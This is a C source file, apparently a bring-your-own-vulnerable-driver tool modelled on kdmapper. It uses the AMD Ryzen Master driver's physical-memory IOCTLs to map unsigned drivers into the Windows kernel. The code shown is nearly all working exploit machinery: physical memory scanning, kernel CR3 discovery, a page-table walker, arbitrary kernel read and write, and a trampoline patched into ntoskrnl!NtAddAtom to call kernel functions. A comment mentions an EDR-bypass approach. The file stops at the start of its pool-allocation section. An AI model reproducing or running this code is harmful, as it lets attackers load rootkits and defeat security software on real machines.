/*
 * kdmap_amd.c â€” Unsigned kernel driver loader via AMDRyzenMasterDriver
 *
 * Concept: https://blog.quarkslab.com/exploiting-lenovo-driver-cve-2025-8061_part2.html
 * Reference implementation: https://github.com/TheCruZ/kdmapper
 *
 * How it works:
 *   AMDRyzenMasterDriverV20 exposes physical memory R/W via MmMapIoSpace().
 *   This bypasses PTE write-protection on kernel code pages.
 *
 *   Chain:
 *   [1] va_to_pa(NtAddAtom_kva) â†’ write 12-byte trampoline via phys_write
 *   [2] Call userland NtAddAtom() â†’ syscall â†’ KiSystemCall64 â†’ our trampoline
 *       â†’ target kernel function runs at PASSIVE_LEVEL with our args
 *   [3] ExAllocatePoolWithTag(NonPagedPool, image_size, tag) â†’ pool VA
 *   [4] In userland: apply PE relocations + resolve imports against live kernel
 *   [5] kernel_write(pool_va, fixed_image) â†’ driver image lands in NonPagedPool
 *   [6] call_kernel_fn(DriverEntry, 0, 0) â†’ driver runs
 *
 * Differences from kdmapper (Intel):
 *   - No MemCopy IOCTL: use va_to_pa() + phys_read/phys_write per page
 *   - No GetPhysicalAddress IOCTL: own CR3 page-table walker
 *   - No MapIoSpace/UnmapIoSpace: phys_write does MmMapIoSpace internally
 *   - Pure C (no C++ templates)
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o kdmap_amd.exe kdmap_amd.c -lkernel32 -ladvapi32
 *
 * Usage:
 *   kdmap_amd.exe <driver.sys>          load driver, call DriverEntry(NULL,NULL)
 *   kdmap_amd.exe <driver.sys> --free   free pool after DriverEntry returns
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Â§1  AMD DRIVER PRIMITIVES
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu

static HANDLE g_dev = INVALID_HANDLE_VALUE;

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;;i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(h,i,vname,&vn,NULL,&type,NULL,&vd)==ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf = (uint8_t*)malloc(vd);
        if (!buf) continue;
        if (RegQueryValueExA(h,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf = NULL;
    }
    RegCloseKey(h);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt = *(DWORD*)(buf+16); uint8_t *p = buf+20;
    for (DWORD i = 0; i<cnt&&g_nranges<MAX_RANGES; i++,p+=20) {
        if (p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base = *(uint64_t*)(p+4);
        g_ranges[g_nranges].size = *(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i = 0; i < g_nranges; i++)
        if (pa>=g_ranges[i].base && pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

/* Pre-allocated I/O output buffer for reads â‰¤ 256 KB */
#define CHUNK_SZ 0x40000
static uint8_t g_io_out[12 + CHUNK_SZ];

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in[12]; *(uint64_t*)in = pa; *(uint32_t*)(in+8) = sz;
    uint32_t osz = 12+sz;
    uint8_t *out; void *dyn = NULL;
    if (osz <= sizeof g_io_out) out = g_io_out;
    else { dyn = malloc(osz); if (!dyn) return 0; out = (uint8_t*)dyn; }
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ, in, 12, out, osz, &got, NULL);
    if (ok && got >= 12) memcpy(buf, out+12, sz);
    free(dyn);
    return ok && got >= 12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa, sz)) return 0;
    uint32_t isz = 12+sz;
    uint8_t *in = (uint8_t*)malloc(isz); if (!in) return 0;
    *(uint64_t*)in = pa; *(uint32_t*)(in+8) = sz;
    memcpy(in+12, data, sz);
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE, in, isz, NULL, 0, &got, NULL);
    free(in);
    return ok;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Â§2  PAGE-TABLE WALKER  (CR3 â†’ kernel VA â†’ PA)
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

static uint64_t g_kernel_cr3    = 0;

/* Forward declarations â€” defined in Â§4/Â§5 after module list */
static uint64_t g_ntoskrnl_va    = 0;
static uint8_t *g_ntoskrnl_pe    = NULL;
static DWORD    g_ntoskrnl_pe_sz = 0;
static uint32_t disk_export_rva(const char *func_name);   /* defined in Â§5 */

/* â”€â”€ ntoskrnl PA â€” identical to all_edr_bypass.c approach (proven) â”€â”€â”€â”€â”€
 * 1. NtBuildNumber RVA from disk PE (already loaded in g_ntoskrnl_pe)
 * 2. Live build number from KUSER_SHARED_DATA (0x7FFE0000+0x260) & 0xFFFF
 * 3. Scan 2MB-aligned PAs; MUST call pa_in_range before phys_read or the
 *    driver may BSOD trying to MmMapIoSpace an invalid physical address.
 * â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static uint64_t find_ntoskrnl_pa(void)
{
    uint32_t rva = disk_export_rva("NtBuildNumber");
    if (!rva) { printf("[-] NtBuildNumber not in disk PE\n"); return 0; }

    /* Live build number â€” KUSER_SHARED_DATA at constant VA 0x7FFE0000 */
    uint32_t ssd = *(uint32_t*)(0x7FFE0000 + 0x260) & 0xFFFF;
    /* NtBuildNumber in live kernel can have various high-byte flags */
    uint32_t c0 = ssd, c1 = ssd|0xF0000000, c2 = ssd|0xC0000000;

    const uint64_t STEP = 0x200000ULL;
    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t base = (g_ranges[ri].base + STEP-1) & ~(STEP-1);
        uint64_t end  = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t pa = base; pa < end; pa += STEP) {
            if (!pa_in_range(pa + rva, 4)) continue;  /* critical guard */
            uint32_t v = 0; phys_read(pa + rva, &v, 4);
            if (v!=c0 && v!=c1 && v!=c2) continue;
            uint16_t mz = 0; phys_read(pa, &mz, 2);
            if (mz == 0x5A4D) {
                printf("[+] ntoskrnl PA=0x%llX (build %u)\n",
                       (unsigned long long)pa, ssd);
                return pa;
            }
        }
    }
    return 0;
}

/* â”€â”€ Find ACTUAL kernel CR3 by verifying ntoskrnl VAâ†’PA mapping â”€â”€â”€â”€â”€â”€â”€ *
 *                                                                         *
 * The self-reference trick finds ANY PML4 that happens to self-point.    *
 * On KPTI-enabled systems this might be the user-mode shadow PML4 which  *
 * only maps a sliver of kernel space â€” not ntoskrnl text.                *
 *                                                                         *
 * Fix: scan candidate PML4 pages and walk the page tables for            *
 * ntoskrnl_va.  Return the first PML4 that correctly maps it to          *
 * ntoskrnl_pa.  Much more reliable than self-reference alone.            *
 * â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static uint64_t find_kernel_cr3_verified(uint64_t nt_va, uint64_t nt_pa)
{
    if (!nt_va || !nt_pa) return 0;

    uint64_t pml4i = (nt_va >> 39) & 0x1FF;
    uint64_t pdpi  = (nt_va >> 30) & 0x1FF;
    uint64_t pdi   = (nt_va >> 21) & 0x1FF;
    uint64_t pti   = (nt_va >> 12) & 0x1FF;

    /* Candidate CR3 pages live in the first 128 GB of physical RAM */
    for (int ri = 0; ri < g_nranges; ri++) {
        uint64_t end = g_ranges[ri].base + g_ranges[ri].size;
        if (end > 0x2000000000ULL) end = 0x2000000000ULL;

        for (uint64_t pa = (g_ranges[ri].base+0xFFFULL)&~0xFFFULL;
             pa + 0x1000 <= end; pa += 0x1000)
        {
            /* Step 1: PML4E for ntoskrnl present? */
            uint64_t pml4e = 0;
            if (!phys_read(pa + pml4i*8, &pml4e, 8) || !(pml4e&1)) continue;
            /* Sanity: PML4E bit7 (PS) must be 0; reserved bits [62:52] must be 0 */
            if (pml4e & ((1ULL<<7) | 0x7FF0000000000000ULL)) continue;

            /* Step 2: PDPT — guard with pa_in_range before dereferencing.
             * pdpt_pa is derived from random page data; without this guard the
             * AMD driver calls MmMapIoSpace on a garbage PA → BSOD. */
            uint64_t pdpt_pa = pml4e & 0x000FFFFFFFFFF000ULL;
            if (!pa_in_range(pdpt_pa + pdpi*8, 8)) continue;
            uint64_t pdpte   = 0;
            if (!phys_read(pdpt_pa + pdpi*8, &pdpte, 8) || !(pdpte&1)) continue;
            if (pdpte & 0x7FF0000000000000ULL) continue;

            /* 1 GB page? */
            if (pdpte & (1ULL<<7)) {
                uint64_t mapped = (pdpte & 0x000FFFFFC0000000ULL) | (nt_va & 0x3FFFFFFF);
                if (mapped == nt_pa) { printf("[+] Kernel CR3=0x%llX (1GB page)\n",(unsigned long long)pa); return pa; }
                continue;
            }

            /* Step 3: PD — guard with pa_in_range before dereferencing */
            uint64_t pd_pa = pdpte & 0x000FFFFFFFFFF000ULL;
            if (!pa_in_range(pd_pa + pdi*8, 8)) continue;
            uint64_t pde   = 0;
            if (!phys_read(pd_pa + pdi*8, &pde, 8) || !(pde&1)) continue;
            if (pde & 0x7FF0000000000000ULL) continue;

            /* 2 MB page? */
            if (pde & (1ULL<<7)) {
                uint64_t mapped = (pde & 0x000FFFFFFFE00000ULL) | (nt_va & 0x1FFFFF);
                if (mapped == nt_pa) { printf("[+] Kernel CR3=0x%llX (2MB page)\n",(unsigned long long)pa); return pa; }
                continue;
            }

            /* Step 4: PT — guard with pa_in_range before dereferencing */
            uint64_t pt_pa = pde & 0x000FFFFFFFFFF000ULL;
            if (!pa_in_range(pt_pa + pti*8, 8)) continue;
            uint64_t pte   = 0;
            if (!phys_read(pt_pa + pti*8, &pte, 8) || !(pte&1)) continue;

            uint64_t mapped = (pte & 0x000FFFFFFFFFF000ULL) | (nt_va & 0xFFF);
            if (mapped == nt_pa) {
                printf("[+] Kernel CR3=0x%llX (4KB page)\n", (unsigned long long)pa);
                return pa;
            }
        }
    }
    return 0;
}

/* Legacy self-reference fallback (kept for compatibility) */
static uint64_t find_kernel_cr3(void)
{
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x10000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x10000000ULL) re = 0x10000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            uint64_t e = 0;
            if (!phys_read(pa + 0x1ED*8, &e, 8)) continue;
            if ((e&1) && (e&0x000FFFFFFFFFF000ULL)==pa) return pa;
        }
    }
    static uint8_t s_pg[4096];
    for (int ri = 0; ri < g_nranges; ri++) {
        if (g_ranges[ri].base >= 0x4000000ULL) continue;
        uint64_t re = g_ranges[ri].base + g_ranges[ri].size;
        if (re > 0x4000000ULL) re = 0x4000000ULL;
        for (uint64_t pa = g_ranges[ri].base; pa < re; pa += 0x1000) {
            if (!phys_read(pa, s_pg, 4096)) continue;
            for (int idx = 0x100; idx < 0x200; idx++) {
                uint64_t e = *(uint64_t*)(s_pg + idx*8);
                if (!(e&1)) continue;
                if ((e&0x000FFFFFFFFFF000ULL)==pa) return pa;
            }
        }
    }
    return 0;
}

static uint64_t va_to_pa(uint64_t va)
{
    if (!g_kernel_cr3) return 0;
    uint64_t pml4i=(va>>39)&0x1FF, pdpi=(va>>30)&0x1FF;
    uint64_t pdi  =(va>>21)&0x1FF, pti =(va>>12)&0x1FF;
    uint64_t e = 0;
    if (!phys_read(g_kernel_cr3+pml4i*8,&e,8)||!(e&1)) return 0;
    if (!phys_read((e&0x000FFFFFFFFFF000ULL)+pdpi*8,&e,8)||!(e&1)) return 0;
    if (e&(1ULL<<7)) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFF);
    if (!phys_read((e&0x000FFFFFFFFFF000ULL)+pdi*8,&e,8)||!(e&1)) return 0;
    if (e&(1ULL<<7)) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFF);
    if (!phys_read((e&0x000FFFFFFFFFF000ULL)+pti*8,&e,8)||!(e&1)) return 0;
    return (e&0x000FFFFFFFFFF000ULL)|(va&0xFFF);
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Â§3  KERNEL MEMORY READ / WRITE  (page-boundary-aware)
 *
 * kernel_write goes through va_to_pa + phys_write, which uses
 * MmMapIoSpace() internally â€” this bypasses PTE write-protection on
 * read-only kernel code pages (same as kdmapper's WriteToReadOnlyMemory).
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

static int kernel_read(uint64_t kva, void *buf, size_t size)
{
    uint8_t *dst = (uint8_t*)buf;
    while (size > 0) {
        uint64_t off   = kva & 0xFFF;
        size_t   chunk = 0x1000 - off;
        if (chunk > size) chunk = size;
        uint64_t pa = va_to_pa(kva);
        if (!pa || !phys_read(pa, dst, (uint32_t)chunk)) return 0;
        dst  += chunk;
        kva  += chunk;
        size -= chunk;
    }
    return 1;
}

static int kernel_write(uint64_t kva, const void *buf, size_t size)
{
    const uint8_t *src = (const uint8_t*)buf;
    while (size > 0) {
        uint64_t off   = kva & 0xFFF;
        size_t   chunk = 0x1000 - off;
        if (chunk > size) chunk = size;
        uint64_t pa = va_to_pa(kva);
        if (!pa || !phys_write(pa, src, (uint32_t)chunk)) return 0;
        src  += chunk;
        kva  += chunk;
        size -= chunk;
    }
    return 1;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Â§4  KERNEL MODULE MAP  (NtQuerySystemInformation class 11)
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase, ImageBase;
    ULONG  ImageSize, Flags;
    USHORT LoadOrderIndex, InitOrderIndex, LoadCount, OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn = (PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                               "NtQuerySystemInformation");
    if (!fn) return NULL;
    ULONG sz = 0x80000; MOD_LIST *ml = NULL; NTSTATUS st;
    do { free(ml); ml = (MOD_LIST*)malloc(sz*=2); st = fn(11,ml,sz,NULL); }
    while (st == (NTSTATUS)0xC0000004L);
    if (st) { free(ml); return NULL; }
    return ml;
}

/* ntoskrnl VA and disk image â€” declared at top of file */

static uint64_t get_kernel_module_base(const char *name)
{
    MOD_LIST *ml = get_module_list(); if (!ml) return 0;
    uint64_t result = 0;
    for (ULONG i = 0; i < ml->NumberOfModules; i++) {
        const char *fn = ml->Modules[i].FullPathName + ml->Modules[i].OffsetToFileName;
        if (_stricmp(fn, name) == 0) {
            result = (uint64_t)ml->Modules[i].ImageBase;
            break;
        }
    }
    free(ml);
    return result;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Â§5  LIVE KERNEL EXPORT RESOLUTION
 *
 * Reads the export table directly from the live kernel module via
 * kernel_read (va_to_pa + phys_read), exactly like kdmapper's
 * GetKernelModuleExport does via its MemCopy IOCTL.
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

static uint64_t get_kernel_export(uint64_t module_kva, const char *func_name)
{
    if (!module_kva || !func_name) return 0;

    IMAGE_DOS_HEADER dos;
    if (!kernel_read(module_kva, &dos, sizeof dos) ||
        dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64 nt;
    if (!kernel_read(module_kva + dos.e_lfanew, &nt, sizeof nt) ||
        nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    DWORD exp_rva = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exp_sz  = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!exp_rva || !exp_sz) return 0;

    IMAGE_EXPORT_DIRECTORY exp;
    if (!kernel_read(module_kva + exp_rva, &exp, sizeof exp)) return 0;

    DWORD n = exp.NumberOfNames;
    DWORD *name_rvas = (DWORD*)malloc(n * 4);
    WORD  *ordinals  = (WORD*) malloc(n * 2);
    DWORD *func_rvas = (DWORD*)malloc(exp.NumberOfFunctions * 4);
    if (!name_rvas || !ordinals || !func_rvas) goto cleanup_null;

    if (!kernel_read(module_kva + exp.AddressOfNames,         name_rvas, n * 4)) goto cleanup_null;
    if (!kernel_read(module_kva + exp.AddressOfNameOrdinals,  ordinals,  n * 2)) goto cleanup_null;
    if (!kernel_read(module_kva + exp.AddressOfFunctions,     func_rvas, exp.NumberOfFunctions * 4)) goto cleanup_null;

    {
        uint64_t result = 0;
        for (DWORD i = 0; i < n && !result; i++) {
            char name_buf[256] = {0};
            if (!kernel_read(module_kva + name_rvas[i], name_buf, sizeof name_buf-1)) continue;
            if (strcmp(name_buf, func_name) != 0) continue;
            WORD ord = ordinals[i];
            if (ord >= exp.NumberOfFunctions) continue;
            DWORD frva = func_rvas[ord];
            if (!frva) continue;
            if (frva >= exp_rva && frva < exp_rva + exp_sz) continue; /* forwarded */
            result = module_kva + frva;
        }
        free(name_rvas); free(ordinals); free(func_rvas);
        return result;
    }

cleanup_null:
    free(name_rvas); free(ordinals); free(func_rvas);
    return 0;
}

/* Convert PE VirtualAddress (RVA) â†’ file offset using section table.
 * Required because disk PEs are NOT memory-mapped: VirtualAddress â‰  file offset. */
static uint32_t rva_to_file_off(const uint8_t *pe, size_t fsz, uint32_t rva)
{
    int32_t elf = *(int32_t*)(pe + 0x3C);
    if (elf < 0 || (size_t)elf + 0x06 > fsz) return 0;
    uint16_t nsec = *(uint16_t*)(pe + elf + 6);              /* NumberOfSections */
    uint16_t optsz = *(uint16_t*)(pe + elf + 20);            /* SizeOfOptionalHeader */
    uint32_t sec_off = (uint32_t)elf + 24 + optsz;           /* first section header */
    for (uint16_t i = 0; i < nsec; i++) {
        uint32_t o = sec_off + i * 40;
        if (o + 40 > fsz) break;
        uint32_t va  = *(uint32_t*)(pe + o + 12); /* VirtualAddress */
        uint32_t vsz = *(uint32_t*)(pe + o + 16); /* VirtualSize */
        uint32_t raw = *(uint32_t*)(pe + o + 20); /* PointerToRawData */
        if (rva >= va && rva < va + vsz && raw)
            return raw + (rva - va);
    }
    /* Fallback: PE headers live before first section (low RVAs â‰ˆ file offsets) */
    return rva;
}

/* Resolve export name â†’ RVA from disk PE (ntoskrnl loaded in g_ntoskrnl_pe).
 *
 * Key fixes vs common broken implementations:
 *   1. 64-bit PE: DataDirectory[0] at e_lfanew+0x88 (OptionalHeader64+0x70)
 *      NOT e_lfanew+0x78 which is the 32-bit offset (OptionalHeader32+0x60)
 *   2. Export table VAs are RVAs â€” must convert to file offset before deref.
 *   3. All pointer arithmetic bounds-checked to avoid out-of-buffer crash.
 */
static uint32_t disk_export_rva(const char *sym)
{
    const uint8_t *pe = g_ntoskrnl_pe;
    size_t fsz = g_ntoskrnl_pe_sz;
    if (!pe || fsz < 0x100 || pe[0]!='M' || pe[1]!='Z') return 0;

    int32_t e_lfanew = *(int32_t*)(pe + 0x3C);
    if (e_lfanew < 0x40 || (size_t)e_lfanew + 0x90 > fsz) return 0;
    if (*(uint32_t*)(pe + e_lfanew) != 0x00004550) return 0;

    /* OptionalHeader.Magic: 0x010B = PE32, 0x020B = PE32+ (64-bit) */
    uint16_t magic = *(uint16_t*)(pe + e_lfanew + 0x18);
    uint32_t exp_dir_rva;
    if (magic == 0x020B) {
        /* PE32+ (64-bit): DataDirectory[0].VirtualAddress at OptionalHeader + 0x70
         * = e_lfanew + 0x18 (FileHeader 4+20) + 0x70 = e_lfanew + 0x88 */
        exp_dir_rva = *(uint32_t*)(pe + e_lfanew + 0x88);
    } else {
        /* PE32 (32-bit): DataDirectory[0].VirtualAddress at OptionalHeader + 0x60
         * = e_lfanew + 0x18 + 0x60 = e_lfanew + 0x78 */
        exp_dir_rva = *(uint32_t*)(pe + e_lfanew + 0x78);
    }
    if (!exp_dir_rva) return 0;

    /* Convert export directory RVA to file offset */
    uint32_t exp_dir_off = rva_to_file_off(pe, fsz, exp_dir_rva);
    if (!exp_dir_off || exp_dir_off + sizeof(IMAGE_EXPORT_DIRECTORY) > fsz) return 0;

    const IMAGE_EXPORT_DIRECTORY *ed =
        (const IMAGE_EXPORT_DIRECTORY*)(pe + exp_dir_off);

    /* Convert array RVAs to file offsets */
    uint32_t names_off = rva_to_file_off(pe, fsz, ed->AddressOfNames);
    uint32_t ords_off  = rva_to_file_off(pe, fsz, ed->AddressOfNameOrdinals);
    uint32_t funcs_off = rva_to_file_off(pe, fsz, ed->AddressOfFunctions);
    if (!names_off || !ords_off || !funcs_off) return 0;
    if (names_off + ed->NumberOfNames*4         > fsz) return 0;
    if (ords_off  + ed->NumberOfNames*2         > fsz) return 0;
    if (funcs_off + ed->NumberOfFunctions*4     > fsz) return 0;

    const DWORD *names = (const DWORD*)(pe + names_off);
    const WORD  *ords  = (const WORD *)(pe + ords_off);
    const DWORD *funcs = (const DWORD*)(pe + funcs_off);

    for (DWORD i = 0; i < ed->NumberOfNames; i++) {
        uint32_t name_off = rva_to_file_off(pe, fsz, names[i]);
        if (!name_off || name_off >= fsz) continue;
        if (strcmp((const char*)(pe + name_off), sym)) continue;
        WORD ord = ords[i];
        if (ord >= ed->NumberOfFunctions) continue;
        return funcs[ord];   /* return the RVA (used to compute kernel VA) */
    }
    return 0;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Â§6  KERNEL FUNCTION CALLER  (NtAddAtom trampoline)
 *
 * Installs a 12-byte trampoline at the start of ntoskrnl!NtAddAtom:
 *     48 B8 [8-byte target VA]   ; movabs rax, target
 *     FF E0                      ; jmp rax
 *
 * Then calls userland NtAddAtom which syscalls into our trampoline.
 * The trampoline runs at PASSIVE_LEVEL with the caller's RCX/RDX/R8/R9
 * as arguments â€” up to 4 args, matching x64 register calling convention.
 *
 * Reference: kdmapper intel_driver.hpp CallKernelFunction<>
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

static uint64_t g_ntaddatom_kva = 0;  /* ntoskrnl!NtAddAtom kernel VA */

/* Locate NtAddAtom once.  Uses disk PE for speed (same RVA as live). */
static int init_ntaddatom(void)
{
    if (g_ntaddatom_kva) return 1;
    uint32_t rva = disk_export_rva("NtAddAtom");
    if (!rva) {
        /* Fallback: walk live export table */
        g_ntaddatom_kva = get_kernel_export(g_ntoskrnl_va, "NtAddAtom");
        return g_ntaddatom_kva != 0;
    }
    g_ntaddatom_kva = g_ntoskrnl_va + rva;
    printf("[*] NtAddAtom kva=0x%llX  pa=0x%llX\n",
           (unsigned long long)g_ntaddatom_kva,
           (unsigned long long)va_to_pa(g_ntaddatom_kva));
    return 1;
}

/*
 * call_kernel_fn(fn_kva, a1..a4) â€” call any kernel function at PASSIVE_LEVEL.
 * Returns: fn's return value (RAX).  Max 4 args.
 */
static uint64_t call_kernel_fn(uint64_t fn_kva,
                                uint64_t a1, uint64_t a2,
                                uint64_t a3, uint64_t a4)
{
    if (!fn_kva) return 0;
    if (!init_ntaddatom()) { printf("[-] NtAddAtom kva init failed\n"); return 0; }

    uint64_t ntaddatom_pa = va_to_pa(g_ntaddatom_kva);
    if (!ntaddatom_pa) { printf("[-] va_to_pa(NtAddAtom) failed\n"); return 0; }

    /* Save original 12 bytes */
    uint8_t orig[12];
    if (!phys_read(ntaddatom_pa, orig, 12)) return 0;

    /* Bail if already hooked (another instance?) */
    if (orig[0]==0x48 && orig[1]==0xb8 && orig[10]==0xff && orig[11]==0xe0) {
        printf("[-] NtAddAtom already has a trampoline â€” aborting\n");
        return 0;
    }

    /* Build: movabs rax, fn_kva; jmp rax */
    uint8_t tramp[12] = {0x48, 0xb8, 0,0,0,0,0,0,0,0, 0xff, 0xe0};
    *(uint64_t*)(tramp+2) = fn_kva;

    /* Write trampoline â€” phys_write uses MmMapIoSpace â†’ bypasses RO PTE */
    if (!phys_write(ntaddatom_pa, tramp, 12)) {
        printf("[-] phys_write trampoline failed\n");
        return 0;
    }

    /* Read-back verify: catches HVCI/VBS blocking code patches, and cache-attribute
     * conflicts where MmMapIoSpace(NonCached) on an already-Cached code page causes
     * the write to be silently discarded or flushed back before our syscall fires. */
    {
        uint8_t chk[12] = {0};
        if (!phys_read(ntaddatom_pa, chk, 12) || memcmp(chk, tramp, 12) != 0) {
            printf("[-] Trampoline verify failed â€” HVCI/VBS or cache conflict?\n");
            printf("    read back: %02x %02x %02x ... %02x %02x\n",
                   chk[0], chk[1], chk[2], chk[10], chk[11]);
            phys_write(ntaddatom_pa, orig, 12);  /* best-effort restore */
            return 0;
        }
    }

    /* Cast userland NtAddAtom as our 4-arg function and call it.
     * Args land in RCX/RDX/R8/R9; syscall dispatches to our trampoline. */
    typedef uint64_t (__stdcall *KFn)(uint64_t, uint64_t, uint64_t, uint64_t);
    KFn ntaddatom = (KFn)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAddAtom");
    uint64_t result = ntaddatom ? ntaddatom(a1, a2, a3, a4) : 0;

    /* Restore original bytes immediately */
    phys_write(ntaddatom_pa, orig, 12);

    return result;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Â§7  KERNEL POOL  (ExAllocatePoolWithTag / ExFreePool)
